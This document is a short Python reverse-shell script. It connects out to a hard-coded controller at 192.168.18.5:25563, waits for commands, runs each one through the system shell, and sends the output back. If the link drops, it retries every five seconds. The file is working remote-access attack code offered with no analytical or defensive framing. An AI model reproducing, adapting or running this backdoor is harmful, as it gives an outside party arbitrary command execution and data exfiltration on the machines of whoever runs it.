import sys
import os
import subprocess
import socket
import time

def connect(ip_address, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       
        s.connect((ip_address, port))
        print(f"Connected to {ip_address} on port {port}")
        return s
    except socket.error as err:
        print(f"Connection error: {err}")
        return None

def wait_for_command(s):
    try:
      
        data = s.recv(1024)

     
        if isinstance(data, bytes):
            data = data.decode()

     
        if data.strip() == "quit":
            print("Received quit command, closing socket.")
            s.close()
            sys.exit(0)
        
        elif len(data) == 0:
            print("Socket connection closed by the server.")
            return True
        else:
          
            print(f"Executing command: {data}")
            proc = subprocess.Popen(data, shell=True,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            stdout_value = proc.stdout.read() + proc.stderr.read()

           
            s.send(stdout_value)
            return False
    except socket.error as err:
        print(f"Socket error during command execution: {err}")
        return True  # Indicate that the socket has "died"

def main():
    ip_address = "192.168.18.5"
    port = 25563

    while True:
        socket_died = False
        try:
            s = connect(ip_address, port)
            if s is None:
                print("Failed to connect, retrying in 5 seconds.")
                time.sleep(5)
                continue

          
            while not socket_died:
                socket_died = wait_for_command(s)

           
            s.close()
        except socket.error as err:
            print(f"Error: {err}, retrying in 5 seconds.")
            time.sleep(5)

if __name__ == "__main__":
    sys.exit(main())
